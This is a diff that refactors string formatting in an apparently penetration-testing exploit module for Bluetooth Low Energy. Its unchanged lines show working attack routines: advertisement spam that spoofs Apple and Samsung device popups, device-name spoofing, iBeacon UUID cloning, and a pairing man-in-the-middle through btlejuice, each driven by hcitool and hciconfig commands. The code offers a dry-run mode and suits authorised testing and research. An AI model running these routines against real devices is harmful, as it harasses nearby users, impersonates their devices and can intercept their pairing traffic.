@@ -89,10 +89,9 @@ class Exploit(Exploit):
 
     def _set_adv_data(self, data: bytes) -> None:
         """Set BLE advertising data via hcitool."""
-        hex_data = " ".join("{:02x}".format(b) for b in data)
+        hex_data = " ".join(f"{b:02x}" for b in data)
         adv_len = len(data)
-        cmd = "sudo hcitool -i {} cmd 0x08 0x0008 {:02x} {}".format(
-            self.interface, adv_len, hex_data)
+        cmd = f"sudo hcitool -i {self.interface} cmd 0x08 0x0008 {adv_len:02x} {hex_data}"
         subprocess.run(cmd.split(), capture_output=True)
 
     def _enable_advertising(self) -> None:
@@ -100,13 +99,13 @@ class Exploit(Exploit):
         self._hciconfig_cmd("up")
         self._hciconfig_cmd("leadv", "3")
         subprocess.run(
-            "sudo hcitool -i {} cmd 0x08 0x000a 01".format(self.interface).split(),
+            f"sudo hcitool -i {self.interface} cmd 0x08 0x000a 01".split(),
             capture_output=True)
 
     def _disable_advertising(self) -> None:
         """Disable BLE advertising."""
         subprocess.run(
-            "sudo hcitool -i {} cmd 0x08 0x000a 00".format(self.interface).split(),
+            f"sudo hcitool -i {self.interface} cmd 0x08 0x000a 00".split(),
             capture_output=True)
         self._hciconfig_cmd("noleadv")
 
@@ -120,7 +119,7 @@ class Exploit(Exploit):
             "windows_swift": self.SAMSUNG_BUDS_ADV,
         }
         adv_data = adv_map.get(self.spoof_type, self.APPLE_AIRDROP_ADV)
-        print_status("BLE spam: {} (data: {} bytes)".format(self.spoof_type, len(adv_data)))
+        print_status(f"BLE spam: {self.spoof_type} (data: {len(adv_data)} bytes)")
 
         self._enable_advertising()
         count = self.count if self.count > 0 else 999999
@@ -140,7 +139,7 @@ class Exploit(Exploit):
         finally:
             self._disable_advertising()
 
-        print_success("BLE spam complete: {} advertisements sent.".format(sent))
+        print_success(f"BLE spam complete: {sent} advertisements sent.")
 
     def _run_name_spoof(self) -> None:
         """Advertise with a crafted device name."""
@@ -148,7 +147,7 @@ class Exploit(Exploit):
         name_len = len(name_bytes)
         adv_data = bytes([name_len + 1, 0x09]) + name_bytes
 
-        print_status("Name spoof: advertising as '{}'".format(self.device_name))
+        print_status(f"Name spoof: advertising as '{self.device_name}'")
         self._enable_advertising()
 
         count = self.count if self.count > 0 else 999999
@@ -163,7 +162,7 @@ class Exploit(Exploit):
         finally:
             self._disable_advertising()
 
-        print_success("Name spoof complete: {} advertisements.".format(sent))
+        print_success(f"Name spoof complete: {sent} advertisements.")
 
     def _run_beacon_hijack(self) -> None:
         """Clone an iBeacon UUID."""
@@ -187,8 +186,7 @@ class Exploit(Exploit):
         ])
         adv_data = ibeacon_prefix + uuid_bytes + major_bytes + minor_bytes + tx_power
 
-        print_status("iBeacon hijack: UUID={} Major={} Minor={}".format(
-            self.beacon_uuid, self.beacon_major, self.beacon_minor))
+        print_status(f"iBeacon hijack: UUID={self.beacon_uuid} Major={self.beacon_major} Minor={self.beacon_minor}")
 
         self._enable_advertising()
         count = self.count if self.count > 0 else 999999
@@ -203,7 +201,7 @@ class Exploit(Exploit):
         finally:
             self._disable_advertising()
 
-        print_success("iBeacon hijack complete: {} beacons.".format(sent))
+        print_success(f"iBeacon hijack complete: {sent} beacons.")
 
     def _run_pair_mitm(self) -> None:
         """BLE MITM during pairing via btlejuice bridge."""
@@ -211,7 +209,7 @@ class Exploit(Exploit):
             print_error("btlejuice not found. Install: npm i -g btlejuice")
             return
 
-        print_status("BLE MITM via btlejuice on {}".format(self.interface))
+        print_status(f"BLE MITM via btlejuice on {self.interface}")
         print_info("Open btlejuice web UI at http://localhost:8080")
 
         try:
@@ -250,15 +248,15 @@ class Exploit(Exploit):
             return
 
         if self.dry_run:
-            print_info("DRY RUN — {} on {} ({})".format(self.mode, self.interface, self.spoof_type))
+            print_info(f"DRY RUN — {self.mode} on {self.interface} ({self.spoof_type})")
             return
 
         for tool in ("hcitool", "hciconfig"):
             if not shutil.which(tool):
-                print_error("{} not found. Install BlueZ.".format(tool))
+                print_error(f"{tool} not found. Install BlueZ.")
                 return
 
-        print_status("Starting {} attack on {}...".format(self.mode, self.interface))
+        print_status(f"Starting {self.mode} attack on {self.interface}...")
 
         if self.mode == "ble_spam":
             self._run_ble_spam()
